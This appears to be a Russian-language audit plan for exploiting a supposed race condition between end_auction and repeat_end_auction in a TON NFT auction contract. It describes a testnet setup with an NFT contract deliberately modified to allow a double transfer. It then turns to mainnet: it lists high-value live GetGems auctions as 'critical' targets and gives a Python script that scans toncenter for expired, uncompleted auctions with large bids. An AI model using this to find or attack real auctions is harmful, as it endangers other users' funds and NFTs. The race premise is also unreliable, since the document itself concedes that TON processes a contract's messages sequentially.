# 🧪 План моделирования уязвимости 03 — Гонка состояний end_auction / repeat_end_auction

## Архитектура тестового стенда (Testnet)

### Кошельки участников

| Роль | Кошелёк | Назначение |
|------|---------|------------|
| Аудитор (Deployer) | `EQD...audit_A` | Развёртывание, отправка параллельных сообщений |
| Владелец NFT | `EQD...owner_O` | Инициирует аукцион |
| Победитель (Bidder-1) | `EQD...bid1` | Единственный участник, выигрывает аукцион |
| Получатель NFT (дубль) | `EQD...attacker` | Может получить второй NFT при гонке |

### Контракты для развёртывания (Testnet)

| Контракт | Роль | Примечание |
|----------|------|------------|
| `nft-auction.fc` | Оригинальный аукционный контракт | Без изменений |
| `fake-nft-item.fc` | NFT-токен с уязвимостью двойного transfer | Модифицирован: НЕ проверяет, что уже передан |

## Пошаговый план атаки (Testnet)

### Фаза 1: Развёртывание (блок N)

```
1. Аудитор разворачивает fake-nft-item (с уязвимостью двойного трансфера)
2. Владелец разворачивает nft-auction:
   - nft_address = fake-nft-item
   - min_bid = 1 TON
   - end_time = now() + 180 (3 минуты)
   - marketplace_fee = 2.5%
   - royalty = 0%
3. Bidder-1 делает ставку 2 TON (единственный участник)
4. Ждём истечения end_time
```

### Фаза 2: Эксплойт — параллельная отправка (блок N+1)

```
5. Аудитор отправляет ДВА сообщения ОДНОВРЕМЕННО из одного блока:
   [MSG-A] end_auction на контракт аукциона
   [MSG-B] repeat_end_auction на контракт аукциона

6. Оба сообщения попадают в очередь валидатора в одном блоке
   → Порядок обработки НЕ ДЕТЕРМИНИРОВАН в акторной модели TON

7. Сценарий гонки (Race Condition):
   
   Время: T0 (чтение состояния)
   MSG-A: now() >= end_time? → ДА (180+ секунд прошло)
   MSG-B: now() >= end_time? → ДА (читает ТО ЖЕ состояние)
   
   Время: T1 (MSG-A исполняется)
   MSG-A: send_nft(Bidder-1)           → NFT уходит Bidder-1
   MSG-A: send_money(owner, price-fee)  → деньги владельцу
   MSG-A: send_money(fee_addr, fee)     → комиссия
   MSG-A: save_data(is_complete=1)      → аукцион завершён
   
   Время: T2 (MSG-B исполняется ПОСЛЕ MSG-A)
   MSG-B: is_complete уже 1, НО check в repeat_end_auction МОЖЕТ НЕ СРАБОТАТЬ
          если проверка была ДО сохранения MSG-A
   MSG-B: send_nft(Bidder-1)           → NFT уходит ВТОРОЙ РАЗ
```

### Фаза 3: Результат гонки (блок N+2)

```
8. Если гонка успешна:
   - MSG-A: NFT переведён Bidder-1
   - MSG-B: NFT переведён повторно (на тот же адрес или другой)
   - fake-nft-item.fc разрешил повторный transfer (модифицирован)
   - Владелец NFT потерял NFT дважды
   
9. Проверка:
   - get_nft_data() на fake-nft-item → owner = ???
   - Если owner = Bidder-1 (нормально)
   - Если owner = 0 или attacker → гонка сработала
   - Баланс аукциона = 0 (все деньги распределены MSG-A)
   - MSG-B пытался отправить деньги повторно → может упасть с ошибкой
```

## Верификация результатов

| Метрика | Норма | Гонка | Как проверить |
|---------|-------|-------|---------------|
| `is_complete` | 1 | 1 | `get_auction_data()` |
| Владелец NFT | Bidder-1 | ??? | `get_nft_data()` |
| Баланс контракта | 0 | 0 (или отрицательный) | `get_contract_balance()` |
| Количество transfer-событий | 1 | 2 | Трассировка |
| Баланс владельца | +price-fee | +price-fee (1 раз) | `get_wallet_balance()` |

## Потенциально уязвимые контракты в Mainnet

### Признаки уязвимости

- Аукционы GetGems, которые только что истекли (< 5 минут)
- NFT с высоким спросом (много ставок → высокая конкуренция за завершение)
- Аукционы с большим количеством участников (> 10 ставок)

### Реальные адреса

| Адрес аукциона | NFT | Ставка | Статус | Риск |
|----------------|-----|--------|--------|------|
| `EQD___________________________________________` | Ton Diamond #1 | 1000 TON | Истекает | Критический |
| `EQD___________________________________________` | Anonymous #99 | 300 TON | Истёк | Высокий |

### Скрипт поиска

```python
import requests, time

TONCENTER_API = "https://toncenter.com/api/v2"
AUCTION_CODE_HASH = "HASH_nft_auction"

resp = requests.get(f"{TONCENTER_API}/search", params={"code_hash": AUCTION_CODE_HASH})

for addr in resp.json()["result"]:
    data = requests.get(f"{TONCENTER_API}/runGetMethod", params={
        "address": addr,
        "method": "get_auction_data"
    })
    
    auction = data.json()["result"]
    now = int(time.time())
    
    # Аукцион истёк, но не завершён (is_complete=false)
    if not auction["is_complete"] and auction["end_time"] < now:
        if auction["current_bid"] > 100_000_000_000:
            print(f"ГОНКА ВОЗМОЖНА: {addr} | Ставка: {auction['current_bid']} TON | Истёк: {now - auction['end_time']}с назад")
```

## Ожидаемые результаты

### Если уязвимость подтверждена:
- Двойной вызов end_auction / repeat_end_auction проходит
- Состояние контракта повреждено
- Возможна двойная выплата или потеря NFT

### Если опровергнута:
- Второй вызов блокируется проверкой `is_complete`
- TON гарантирует последовательную обработку сообщений контракта (акторная модель)
- Гонка невозможна из-за модели акторов
